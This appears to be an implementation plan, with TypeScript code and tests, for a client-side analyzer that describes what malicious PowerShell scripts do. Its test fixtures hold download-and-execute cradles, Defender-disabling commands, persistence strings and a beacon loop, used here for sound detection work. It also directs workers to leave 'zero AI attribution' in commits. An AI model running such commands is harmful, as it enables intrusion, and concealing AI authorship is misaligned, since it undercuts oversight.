# Analyzer Kill-Chain Bullets Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement SOCDesk analyzer spec §7 — a deterministic, execution-ordered "what did it do" action-bullet breakdown (`bullets.ts`) wired into `analyze()` and rendered between the technique tally and the decode ladder.

**Architecture:** `bullets.ts` adds a declarative `ActionRule` table (mirroring `techniques.ts`'s `SignatureRule` table) whose rules fire against a `BulletContext` — the existing `RuleContext` widened with the already-computed `layers`/`iocs`/`signals` facts — and render verb-first, three-tier-confidence `ActionBullet`s. `deriveBullets()` sorts hits by a fixed verb-family priority (with `layer.index` as a tie-break) rather than the AST-only `(statementIndex, dataflowDepth)` ordering the spec names, since the flat token-pass pipeline has neither. A small, isolated `resolve.ts` addition (`resolveWithFacts`) surfaces the previously-discarded "this variable never resolved to a literal" fact so a fetch/exec bullet can honestly degrade to `inferred` instead of claiming an object it never resolved.

**Tech Stack:** TypeScript, `shared/analyzer`, vitest (`web/vitest.config.ts` globs `../shared/**/*.test.ts` — no config change needed).

**Spec:** `C:\Users\Carl\Desktop\Projects\VIGIL\docs\superpowers\specs\2026-08-19-powershell-analyzer-design.md` §7 (also §9 UI layout, §12 tests). Binding design decisions (this plan transcribes them; do not deviate): `C:\Users\Carl\AppData\Local\Temp\claude\C--Users-Carl-Projects\8c5724fd-c5d1-4749-8d49-e63bb2cf1151\scratchpad\bullets-design-decisions.md`.

## Global Constraints

- Deterministic, client-side, **NEVER executes input** — no `eval`/`new Function`/dynamic dispatch of the pasted script, at any stage.
- The PowerShell path stays byte-identical and the existing `shared/analyzer/__tests__/*` suite stays green — **verified 2026-08-19: 138 tests across 12 files** (`npx vitest run shared/analyzer` from the repo root), not the 264 figure carried in some prior notes; treat 138/12 as the zero-regression baseline for this plan.
- **Bullets never invent intent** — no `malicious`/`attacker`/`likely`/`C2` in any rendered bullet text unless that exact word is itself a resolved fact (mirrors `shared/verdict/doctrine.ts`'s structural verdict-word ban). This is the banned-word test (§7/D6).
- **Reserved-colour law** — bullets are neutral/periwinkle facts, never a red/amber verdict hue. The characterization callout (`TechniqueTally`) is the analyzer's one considered severity read; `ActionBullets` never duplicates or overrides it.
- Zero AI attribution in any commit, comment, or doc. Commits `feat(analyzer): …` as SaltyCarl.

---

## File Structure

- **Create `shared/analyzer/bullets.ts`** — `BulletContext`, `Match`, `ActionRule`, `VerbFamily`, `FAMILY_PRIORITY`, the `RULES` table (D5), and `deriveBullets(ctx, layers, iocs, signals): ActionBullet[]` (D1/D2/D3).
- **Create `web/src/components/analyzer/ActionBullets.tsx`** — renders `AnalysisResult.bullets`: a confident (`resolved`/`inferred`) ordered list, then a muted "Could not resolve" block for `opaque` bullets (D7).
- **Create `shared/analyzer/__tests__/bullets.test.ts`** — per-rule unit coverage (Task 2) extended with the ordering/banned-word/opaque-quarantine/end-to-end fixtures (Task 5, D6).
- **Modify `shared/analyzer/resolve.ts`** — adds `resolveVarsWithFacts`/`resolveWithFacts`, which surface the `poisoned` (unresolved-variable) set `resolveVars` already computes at `resolve.ts:63` and today discards. `resolveVars`/`resolve`'s existing string-returning signatures are kept byte-identical (D4).
- **Modify `shared/analyzer/types.ts`** — `DecodedLayer` gains an optional `hadUnresolvedOperand?: boolean` (D4's "per resolved layer" fact). `ActionBullet`/`ConfidenceTier` already exist unchanged (verified at `types.ts:5` and `types.ts:55-62`) — no other type changes needed.
- **Modify `shared/analyzer/report.ts`** — the resolve loop (`report.ts:175-189`) switches from `resolve()` to `resolveWithFacts()` and tags the pushed `resolve (fold/substitute)` layer with `hadUnresolvedOperand` when true; `analyze()` calls `deriveBullets()` at the `bullets: []` site (`report.ts:218`); `composeCopyText` (`report.ts:297`) gains a `bullets` parameter and a "What it did" section (D7).
- **Modify `web/src/components/analyzer/AnalyzerResult.tsx`** — inserts `<ActionBullets bullets={result.bullets} />` between `TechniqueTally` (`AnalyzerResult.tsx:31`) and `DecodeLadder` (`AnalyzerResult.tsx:32`), per §9's layout order and D7.

---

### Task 1: `resolve.ts` surfaces the unresolved-operand fact (D4)

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Modify: `shared/analyzer/types.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts`

**Interfaces:**
- Consumes: `tokenize` (`lex.ts`), the existing `resolveVars(text: string): string` internals (`resolve.ts:51-78`), specifically the `poisoned` set built at `resolve.ts:55`/`resolve.ts:60`/`resolve.ts:63` and today discarded when the function returns.
- Produces:
  - `export function resolveVarsWithFacts(text: string): { text: string; poisoned: string[] }` (`resolve.ts`) — same substitution logic as `resolveVars`, plus the sorted, deduped list of variable names that never resolved to a literal (reassigned, assigned to a non-literal, referenced before assignment, or never bound at all).
  - `resolveVars(text: string): string` becomes a one-line wrapper (`resolveVarsWithFacts(text).text`) — **byte-identical output for every existing call site**, so `resolve.test.ts`'s current assertions need no changes.
  - `export function resolveWithFacts(text: string): { text: string; hadUnresolvedOperand: boolean }` (`resolve.ts`) — the same 12-pass fixpoint loop as `resolve()` (`resolve.ts:91-101`), but ORs in `poisoned.length > 0` from every pass instead of discarding it.
  - `DecodedLayer.hadUnresolvedOperand?: boolean` (`types.ts`) — the per-layer fact Task 3 sets and Task 2's `bullets.ts` reads.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/resolve.test.ts`:

```ts
import { foldConcat, resolveVars, resolveVarsWithFacts, resolve, resolveWithFacts, normalize } from '../resolve'
```

```ts
describe('resolveVarsWithFacts / resolveWithFacts — the D4 poisoned-fact surface', () => {
  it('resolveVars (the existing string-returning call) is byte-identical to before', () => {
    expect(resolveVars("$u = 'http://a/x' ; IEX $u")).toContain("IEX 'http://a/x'")
    expect(resolveVars("$u = 'a' ; $u = 'b' ; IEX $u")).toContain('IEX $u')
    expect(resolveVars('IEX $undefined')).toContain('IEX $undefined')
  })

  it('resolveVarsWithFacts reports no poisoned names when every var resolves to a literal', () => {
    const r = resolveVarsWithFacts("$u = 'http://a/x' ; IEX $u")
    expect(r.text).toContain("IEX 'http://a/x'")
    expect(r.poisoned).toEqual([])
  })

  it('resolveVarsWithFacts reports a poisoned name for a variable reassigned (ambiguous)', () => {
    const r = resolveVarsWithFacts("$u = 'a' ; $u = 'b' ; IEX $u")
    expect(r.poisoned).toContain('$u')
  })

  it('resolveVarsWithFacts reports a poisoned name for a variable with no literal binding at all', () => {
    const r = resolveVarsWithFacts('IEX $undefined')
    expect(r.poisoned).toContain('$undefined')
  })

  it('resolveWithFacts.hadUnresolvedOperand is false for a fully-resolvable cradle', () => {
    const r = resolveWithFacts("$a = 'http://ev' ; $b = 'il.test/x' ; $u = $a + $b ; IEX $u")
    expect(r.text).toContain("IEX 'http://evil.test/x'")
    expect(r.hadUnresolvedOperand).toBe(false)
  })

  it('resolveWithFacts.hadUnresolvedOperand is true when the fetch target never resolves', () => {
    const r = resolveWithFacts("IEX (New-Object Net.WebClient).DownloadString($u)")
    expect(r.hadUnresolvedOperand).toBe(true)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/resolve.test.ts`
Expected: FAIL — `resolveVarsWithFacts`/`resolveWithFacts` are not exported yet.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/resolve.ts`, replace the existing `resolveVars` (lines 47-78) with:

```ts
/** Substitute single-assignment `$var = '<literal>'` bindings, and report the
 *  set of variable names that could NOT be resolved to a literal: assigned
 *  more than once, assigned to a non-literal, referenced before assignment,
 *  or never bound at all. `resolveVars` (below) is the pre-existing
 *  string-only call shape, kept byte-identical for every current call site —
 *  this is its internals, exposed so `resolveWithFacts` can see the poisoned
 *  set instead of discarding it (bullets design D4). */
export function resolveVarsWithFacts(text: string): { text: string; poisoned: string[] } {
  const toks = tokenize(text)
  // Pass 1: collect single-assignment bindings + the token index of the assignment.
  const bound = new Map<string, { value: string; at: number }>()
  const poisoned = new Set<string>()
  for (let i = 0; i < toks.length; i++) {
    if (isVar(toks[i]) && isEq(toks[i + 1])) {
      const name = toks[i].value
      if (toks[i + 2]?.type === 'string' && !isPlus(toks[i + 3])) {
        if (bound.has(name) || poisoned.has(name)) { bound.delete(name); poisoned.add(name) }
        else bound.set(name, { value: toks[i + 2].value, at: i })
      } else {
        bound.delete(name); poisoned.add(name) // assigned to a non-literal → ambiguous
      }
    }
  }
  // Pass 2: substitute a bound var ONLY at a use site AFTER its assignment (never
  // the LHS, never a use-before-def), escaping quotes so it round-trips. A
  // reference that's still a bare $var here — never bound, or used before its
  // one assignment — is an unresolved operand too, even though pass 1 never
  // poisoned it (pass 1 only poisons "bound then invalidated").
  const out: string[] = []
  for (let i = 0; i < toks.length; i++) {
    const t = toks[i]
    const isAssignLhs = isVar(t) && isEq(toks[i + 1])
    const b = isVar(t) && !isAssignLhs ? bound.get(t.value) : undefined
    if (b && i > b.at) {
      out.push(`'${b.value.replace(/'/g, "''")}'`)
    } else {
      if (isVar(t) && !isAssignLhs && !b) poisoned.add(t.value)
      out.push(emit(t))
    }
  }
  return { text: out.join(' '), poisoned: [...poisoned].sort() }
}

/** The pre-existing string-only call shape — unchanged for every current call site. */
export function resolveVars(text: string): string {
  return resolveVarsWithFacts(text).text
}
```

Then, immediately after `resolve()` (`resolve.ts:91-101`), add:

```ts
/** Same fixpoint loop as resolve(), but also reports whether ANY variable
 *  reference encountered along the way never resolved to a literal. Backs
 *  the bullets 'inferred' confidence tier (D3/D4 of the bullets design): an
 *  object built from an unresolved operand is a real, honest distinction
 *  from one built entirely from literals. */
export function resolveWithFacts(text: string): { text: string; hadUnresolvedOperand: boolean } {
  const MAX_OUTPUT = 1 << 20
  let cur = text
  let hadUnresolvedOperand = false
  for (let i = 0; i < 12; i++) {
    const { text: varsResolved, poisoned } = resolveVarsWithFacts(cur)
    if (poisoned.length) hadUnresolvedOperand = true
    const next = foldConcat(varsResolved)
    if (next.length > MAX_OUTPUT) return { text: cur, hadUnresolvedOperand }
    if (next === cur) return { text: next, hadUnresolvedOperand }
    cur = next
  }
  return { text: cur, hadUnresolvedOperand }
}
```

In `shared/analyzer/types.ts`, widen `DecodedLayer` (`types.ts:26-32`):

```ts
export interface DecodedLayer {
  index: number
  transform: string
  text: string | null
  state: DecodeState
  residual?: { bytes: number; entropy: number; note: string }
  hadUnresolvedOperand?: boolean  // D4: this layer's resolve pass saw an operand that never resolved to a literal
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/resolve.test.ts` then `npx vitest run shared/analyzer`
Expected: PASS. All 138 pre-existing specs stay green — `resolveVars`/`resolve`'s outward behavior is unchanged.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/types.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): surface unresolved-operand fact from resolve.ts"
```

---

### Task 2: `bullets.ts` — the `ActionRule` table + `deriveBullets` (D1/D2/D3/D5, SOC-review revision)

**Files:**
- Create: `shared/analyzer/bullets.ts`
- Test: `shared/analyzer/__tests__/bullets.test.ts` (new)

**Interfaces:**
- Consumes: `RuleContext`, `DecodedLayer` (incl. `hadUnresolvedOperand` from Task 1), `ExtractedIoc`, `Signal`, `ActionBullet`, `ConfidenceTier` (all `types.ts`, unchanged shapes except `DecodedLayer`); `buildContext(text, flags, interpreter?)` (`techniques.ts:25`, unchanged).
- Produces:
  - `export type VerbFamily = 'delivery' | 'interpreter-transition' | 'deobfuscate' | 'decode' | 'decompress' | 'evade' | 'fetch' | 'execute' | 'inject' | 'persist' | 'beacon'` and `export const FAMILY_PRIORITY: Record<VerbFamily, number>` — the **revised D2 11-tier order**: `delivery(1) → interpreter-transition(2) → deobfuscate(3) → decode(4) → decompress(5) → evade(6) → fetch(7) → execute(8) → inject(9) → persist(10) → beacon(11)`. `deobfuscate` (3) still has zero rules in v1 — reserved for the deferred D8 caret-cmdlex bullet. `clickfix` is now its own `delivery` tier (was unmapped before this revision); the three interpreter-hop rules (`cmd-launches-powershell`, `mshta-execute`, `wsh-execute`) move out of `execute` into their own `interpreter-transition` tier — a nested payload is REVEALED before it decodes/executes, not "executed" itself (SOC-review fix: avoids a flaky ordering test).
  - `export interface BulletContext extends RuleContext { layers: DecodedLayer[]; iocs: ExtractedIoc[]; signals: Signal[] }`.
  - `export interface Match { layerIndex: number; confidence: ConfidenceTier; iocs: string[]; techniqueIds: string[]; vars: Record<string, string> }`.
  - `export interface ActionRule { id: string; requiredFacts: string[]; family: VerbFamily; fires(ctx: BulletContext): Match | null; render(m: Match): { verb: string; text: string } }`.
  - `export const RULES: ActionRule[]` — **28 rules** (the original 19, +1 `clickfix-delivery`, +6 per-LOLBin rules keyed off the generic `lolbin` signal's `trigger`, +1 from splitting `amsi-tamper` into `amsi-reflection-bypass`/`amsi-memory-patch-bypass`, +1 from splitting `defender-disable` into `defender-disable-rtm`/`defender-add-exclusion` — each split pair fires independently off its OWN resolved sub-fact so both can co-fire; never a slash-hedge pick between them per D5's must-fix #3/RENDER RULE).
  - `export function deriveBullets(ctx: RuleContext, layers: DecodedLayer[], iocs: ExtractedIoc[], signals: Signal[]): ActionBullet[]` — Task 3's ONLY call site.

- [ ] **Step 1: Write the failing tests**

Create `shared/analyzer/__tests__/bullets.test.ts`:

```ts
// shared/analyzer/__tests__/bullets.test.ts
import { describe, expect, it } from 'vitest'
import { deriveBullets } from '../bullets'
import { buildContext } from '../techniques'
import type { DecodedLayer, ExtractedIoc, Signal } from '../types'

function sig(id: string, overrides: Partial<Signal> = {}): Signal {
  return { id, label: id, techniqueIds: [], specificity: 'strong', trigger: id, ...overrides }
}

describe('deriveBullets — delivery family (SOC must-fix #1)', () => {
  it('a clickfix signal with an actual decoy phrase in the corpus fires the fake-verification-prompt bullet', () => {
    const ctx = buildContext('captcha — please verify you are human, then paste this in Win+R', [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text === 'Presents a fake human-verification prompt instructing the user to paste and run this command (ClickFix pattern)')).toBe(true)
  })

  it('a clickfix signal with NO decoy/headless text (the generic hidden+nop+fetch+IEX fallback) does NOT fire the delivery bullet', () => {
    // clickfix's own techniques.ts rule also fires on a bare hidden+nop+fetch+IEX
    // cradle with no literal verification prompt — asserting "presents a fake
    // human-verification prompt" there would be an invented fact. The delivery
    // bullet requires the actual decoy/headless discriminator, not just the signal.
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], [], [sig('clickfix')])
    expect(bullets.some((b) => b.text.includes('human-verification'))).toBe(false)
  })
})

describe('deriveBullets — decode/decompress family', () => {
  it('a fully-decoded -enc layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: "IEX 'hi'", state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext("IEX 'hi'", [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('Base64 `-EncodedCommand`'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('resolved')
  })

  it('an opaque (malformed) -enc layer fires an opaque decode bullet, not resolved', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → UTF-16LE', text: null, state: 'opaque', residual: { bytes: 9, entropy: 0, note: 'malformed' } }]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), layers, [], [])
    const b = bullets.find((x) => x.text.includes('malformed'))
    expect(b).toBeTruthy()
    expect(b!.confidence).toBe('opaque')
  })

  it('a Base64 → inflate layer fires a resolved decompress bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Base64 → inflate', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text.includes('Decompresses an embedded blob'))).toBe(true)
  })

  it('a Chr()/fromCharCode layer fires a resolved decode bullet', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'Chr()/fromCharCode → text', text: 'Hi', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('Hi', [], 'mshta'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Decodes Chr()/fromCharCode-encoded text')).toBe(true)
  })
})

describe('deriveBullets — interpreter-transition family (SOC must-fix #2: never assert "hidden" unconditionally)', () => {
  it('a cmd→powershell hop with NO -w flag resolved omits "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const bullets = deriveBullets(buildContext('IEX x', [], 'powershell'), layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe')).toBe(true)
    expect(bullets.some((b) => b.text.includes('hidden window'))).toBe(false)
  })

  it('a cmd→powershell hop WITH the -w flag resolved appends "(hidden window)"', () => {
    const layers: DecodedLayer[] = [{ index: 0, transform: 'cmd→powershell -enc', text: 'IEX x', state: 'fully-decoded' }]
    const ctx = buildContext('IEX x', [{ flag: '-w', raw: '-w hidden', techniqueIds: ['T1564.003'] }], 'powershell')
    const bullets = deriveBullets(ctx, layers, [], [])
    expect(bullets.some((b) => b.text === 'Launches a PowerShell child process from cmd.exe (hidden window)')).toBe(true)
  })

  it('an mshta-interpreter signal fires the mshta-execute bullet naming its trigger', () => {
    const signals = [sig('mshta-interpreter', { techniqueIds: ['T1218.005'], trigger: 'https://' })]
    const bullets = deriveBullets(buildContext('', [], 'mshta'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Executes an mshta payload (`https://`)')).toBe(true)
  })

  it('a wsh-script-exec signal fires a language- and host-aware bullet', () => {
    const signals = [sig('wsh-script-exec', { techniqueIds: ['T1059.005'] })]
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Runs a vbs script via wscript')).toBe(true)
  })
})

describe('deriveBullets — fetch/execute family, resolved vs inferred, method-named (SOC must-fix #4)', () => {
  it('a resolved download-cradle URL names the download method and the IOC', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
    const iocs: ExtractedIoc[] = [{ raw: 'http://45.9.148.20/a.ps1', defanged: 'hxxp://45[.]9[.]148[.]20/a[.]ps1', type: 'url', layerIndex: 0 }]
    const ctx = buildContext("IEX (New-Object Net.WebClient).DownloadString('http://45.9.148.20/a.ps1')", [], 'powershell')
    const bullets = deriveBullets(ctx, [], iocs, signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Downloads content from **hxxp://45[.]9[.]148[.]20/a[.]ps1** via `WebClient.DownloadString`')
    expect(b!.iocs).toEqual(['http://45.9.148.20/a.ps1'])
    expect(bullets.some((x) => x.text.includes('Executes the downloaded content in memory'))).toBe(true)
  })

  it('names Invoke-WebRequest and Start-BitsTransfer when those are the resolved method', () => {
    const signals = [sig('download-cradle')]
    const iwr = deriveBullets(buildContext('Invoke-WebRequest http://x.test/a | IEX', [], 'powershell'), [], [], signals)
    expect(iwr.find((b) => b.verb === 'Downloads')!.text).toContain('via `Invoke-WebRequest`')
    const bits = deriveBullets(buildContext('Start-BitsTransfer -Source http://x.test/a ; IEX $x', [], 'powershell'), [], [], signals)
    expect(bits.find((b) => b.verb === 'Downloads')!.text).toContain('via `Start-BitsTransfer`')
  })

  it('an unresolved download-cradle target degrades to inferred, no IOC named', () => {
    const signals = [sig('download-cradle', { techniqueIds: ['T1059.001', 'T1105'] })]
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], signals)
    const b = bullets.find((x) => x.verb === 'Downloads')
    expect(b!.confidence).toBe('inferred')
    expect(b!.text).toBe('Downloads content from a URL assembled at runtime — not resolved')
  })

  it('a cmd-cradle signal fires the fetches-via-for/f bullet', () => {
    const signals = [sig('cmd-cradle', { techniqueIds: ['T1059.003', 'T1105'] })]
    const bullets = deriveBullets(buildContext('', [], 'cmd'), [], [], signals)
    expect(bullets.some((b) => b.text === 'Fetches a command via `for /f`/finger and executes its output')).toBe(true)
  })
})

describe('deriveBullets — per-LOLBin bullets off the generic lolbin signal (SOC must-fix #1)', () => {
  const LOLBIN_EXPECT: Record<string, string> = {
    certutil: 'Decodes/downloads a payload via `certutil`',
    bitsadmin: 'Fetches a file via `bitsadmin`/BITS transfer',
    regsvr32: 'Registers and executes a remote script via `regsvr32` (Squiblydoo)',
    rundll32: 'Executes code via `rundll32`',
    wmic: 'Executes via `wmic`',
  }
  for (const [bin, text] of Object.entries(LOLBIN_EXPECT)) {
    it(`lolbin trigger "${bin}" fires its dedicated bullet`, () => {
      const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: bin })])
      expect(bullets.some((b) => b.text === text)).toBe(true)
    })
  }

  it('msiexec interpolates the resolved MSI URL, or degrades honestly when unresolved', () => {
    const iocs: ExtractedIoc[] = [{ raw: 'http://x.test/a.msi', defanged: 'hxxp://x[.]test/a[.]msi', type: 'url', layerIndex: 0 }]
    const resolved = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('lolbin', { trigger: 'msiexec' })])
    expect(resolved.some((b) => b.text === 'Installs from a remote MSI via `msiexec /i hxxp://x[.]test/a[.]msi`')).toBe(true)
    const unresolved = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'msiexec' })])
    expect(unresolved.some((b) => b.text.includes('URL not resolved'))).toBe(true)
  })

  it('a lolbin trigger for a binary with NO dedicated ActionRule (e.g. finger, mshta) fires no LOLBin-specific bullet', () => {
    // mshta already has its own mshta-execute rule off the mshta-interpreter
    // signal — a duplicate "LOLBin: mshta" bullet would double up the reveal.
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('lolbin', { trigger: 'mshta' })])
    expect(bullets).toHaveLength(0)
  })
})

describe('deriveBullets — evade family: split rules, no slash-hedge (SOC must-fix #3)', () => {
  it('amsi-reflection and amsi-memory-patch are independent rules that can BOTH fire', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('amsi-reflection'), sig('amsi-memory-patch')])
    expect(bullets.some((b) => b.text === 'Disables AMSI (script scanning) via reflection')).toBe(true)
    expect(bullets.some((b) => b.text === 'Disables AMSI via an in-memory patch (`AmsiScanBuffer`)')).toBe(true)
  })

  it('etw-tamper fires the ETW-blind bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('etw-tamper')])
    expect(bullets.some((b) => b.text === 'Blinds ETW logging')).toBe(true)
  })

  it('defender-disable-rtm and defender-add-exclusion are independent rules that can BOTH fire, each naming only its own resolved sub-fact', () => {
    const both = deriveBullets(
      buildContext("Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\Users\\Public\\x'", [], 'powershell'),
      [], [], [sig('defender-tamper')],
    )
    expect(both.some((b) => b.text === 'Disables Microsoft Defender real-time monitoring')).toBe(true)
    expect(both.some((b) => b.text === "Adds a Microsoft Defender exclusion for **C:\\Users\\Public\\x**")).toBe(true)
    // never a combined "X / Y" hedge string
    expect(both.some((b) => b.text.includes(' / '))).toBe(false)
  })

  it('only the resolved evasion-cluster flags are named — never an unresolved one', () => {
    const twoFlags = deriveBullets(
      buildContext('', [{ flag: '-w', raw: '-w hidden', techniqueIds: [] }, { flag: '-nop', raw: '-nop', techniqueIds: [] }], 'powershell'),
      [], [], [sig('evasion-cluster')],
    )
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).toBe('Runs hidden, no-profile')
    expect(twoFlags.find((b) => b.verb === 'Runs')!.text).not.toContain('execution-policy bypass')
  })
})

describe('deriveBullets — inject/persist/beacon families', () => {
  it('fileless-loader fires the in-memory-injection bullet', () => {
    const bullets = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('fileless-loader')])
    expect(bullets.some((b) => b.text === 'Allocates executable memory and starts a thread on embedded shellcode (in-memory injection)')).toBe(true)
  })

  it('persistence names the mechanism from the resolved corpus', () => {
    const task = deriveBullets(buildContext('Register-ScheduledTask -TaskName evil', [], 'powershell'), [], [], [sig('persistence')])
    expect(task.find((b) => b.verb === 'Creates')!.text).toContain('a scheduled task')
    const run = deriveBullets(buildContext('reg add HKCU\\...\\CurrentVersion\\Run /v x', [], 'powershell'), [], [], [sig('persistence')])
    expect(run.find((b) => b.verb === 'Creates')!.text).toContain('an autostart Run-key')
    const wmi = deriveBullets(buildContext('__EventFilter ... CommandLineEventConsumer', [], 'powershell'), [], [], [sig('persistence')])
    expect(wmi.find((b) => b.verb === 'Creates')!.text).toContain('a WMI event subscription')
  })

  it('beaconing names a resolved host and, when the Start-Sleep interval resolves, appends "every ~{n}s"', () => {
    const iocs: ExtractedIoc[] = [{ raw: '45.9.148.20', defanged: '45[.]9[.]148[.]20', type: 'ipv4', layerIndex: 0 }]
    const withInterval = deriveBullets(buildContext('while ($true) { Start-Sleep 30; IEX $x }', [], 'powershell'), [], iocs, [sig('beaconing')])
    const b = withInterval.find((x) => x.verb === 'Beacons')
    expect(b!.confidence).toBe('resolved')
    expect(b!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop every ~30s')
    const noInterval = deriveBullets(buildContext('', [], 'powershell'), [], iocs, [sig('beaconing')])
    expect(noInterval.find((x) => x.verb === 'Beacons')!.text).toBe('Beacons to **45[.]9[.]148[.]20** in a loop')
  })

  it('reverse-shell degrades to inferred with no host IOC', () => {
    const noHost = deriveBullets(buildContext('', [], 'powershell'), [], [], [sig('reverse-shell')])
    expect(noHost.find((b) => b.verb === 'Opens')!.confidence).toBe('inferred')
  })
})

describe('deriveBullets — WSH honesty signals quarantine to opaque', () => {
  it('wsh-decode-limits and wsh-concat-eval-present both render opaque-tier bullets', () => {
    const bullets = deriveBullets(buildContext('', [], 'wscript'), [], [], [sig('wsh-decode-limits'), sig('wsh-concat-eval-present')])
    expect(bullets).toHaveLength(2)
    expect(bullets.every((b) => b.confidence === 'opaque')).toBe(true)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/bullets.test.ts`
Expected: FAIL — `../bullets` does not exist yet.

- [ ] **Step 3: Write minimal implementation**

Create `shared/analyzer/bullets.ts`:

```ts
// shared/analyzer/bullets.ts
//
// Spec §7 — the "what did it do" breakdown, execution-ordered plain-English
// action bullets. Each ActionRule fires ONLY on facts the parser already
// resolved (layers/signals/iocs from report.ts's analyze()) — it never
// invents intent; maliciousness lives only in techniques.ts's signal layer.
//
// Ordering (D2, a documented DELTA from spec §7's literal (statementIndex,
// dataflowDepth), SOC-reviewed): the pipeline is flat token-passes, not an
// AST (§2 doctrine), so there is no statement index or dataflow depth to
// sort by. Instead: a fixed verb-family priority (delivery → reveal-nested →
// deobfuscate → decode → decompress → evade → fetch → execute → inject →
// persist → beacon), with a DecodedLayer's `index` as a secondary tie-break
// when a bullet is anchored to one.
//
// RENDER RULE (SOC must-fix, binding for every rule below): branch on the
// resolved sub-fact and emit ONLY it — never a slash/pipe hedge ("X / Y"),
// never a word (e.g. "hidden") that wasn't actually resolved. Where a fact
// has multiple independent sub-facts (AMSI bypass method, Defender tamper
// mode), that's TWO separate ActionRules that can both fire, not one rule
// picking between them.

import type {
  ActionBullet,
  ConfidenceTier,
  DecodedLayer,
  ExtractedIoc,
  RuleContext,
  Signal,
} from './types'

export type VerbFamily =
  | 'delivery' | 'interpreter-transition' | 'deobfuscate' | 'decode' | 'decompress' | 'evade'
  | 'fetch' | 'execute' | 'inject' | 'persist' | 'beacon'

// D2's revised 11-tier order. `deobfuscate` (3) has no rule in v1 — reserved
// for the deferred D8 "deobfuscates caret-escaped cmd" bullet, so it slots in
// at the right priority with no reordering when that lands.
export const FAMILY_PRIORITY: Record<VerbFamily, number> = {
  delivery: 1,
  'interpreter-transition': 2,
  deobfuscate: 3,
  decode: 4,
  decompress: 5,
  evade: 6,
  fetch: 7,
  execute: 8,
  inject: 9,
  persist: 10,
  beacon: 11,
}

/** The ctx an ActionRule matches against: the same RuleContext techniques.ts
 *  rules use, widened with the layer/IOC/signal facts report.ts has already
 *  computed by the time deriveBullets runs. */
export interface BulletContext extends RuleContext {
  layers: DecodedLayer[]
  iocs: ExtractedIoc[]
  signals: Signal[]
}

/** What an ActionRule's fires() hands to its own render() — the facts needed
 *  to write the bullet, never invented by render() itself. */
export interface Match {
  layerIndex: number             // tie-break within a verb-family (D2); 0 when not layer-anchored
  confidence: ConfidenceTier
  iocs: string[]                 // raw IOC values referenced inline, verbatim
  techniqueIds: string[]
  vars: Record<string, string>   // resolved interpolation values (url, host, mechanism, …)
}

export interface ActionRule {
  id: string
  requiredFacts: string[]        // documentation of what fires() gates on
  family: VerbFamily
  fires(ctx: BulletContext): Match | null
  render(m: Match): { verb: string; text: string }
}

const HOST_TYPES = new Set(['url', 'domain', 'ipv4', 'ipv6'])
function findHostIoc(iocs: ExtractedIoc[]): ExtractedIoc | undefined {
  return iocs.find((i) => HOST_TYPES.has(i.type))
}

// The clickfix SIGNAL (techniques.ts) fires broadly — including on a bare
// hidden+no-profile+fetch+IEX cradle with NO literal verification-prompt text
// (its own `hiddenFetchIex` branch). Asserting "presents a fake
// human-verification prompt" there would be an invented fact. The delivery
// bullet re-checks for the actual decoy phrase / headless-conhost text — the
// same discriminators techniques.ts's own decoy/headless branches use — so it
// only fires when a real ClickFix presentation is present in the corpus.
const CLICKFIX_DECOY_PHRASES = ['verify you are human', 'i am not a robot', 'ray id', 'captcha', 'press win+r', 'press enter to verify']
function isClickfixPresentation(ctx: BulletContext): boolean {
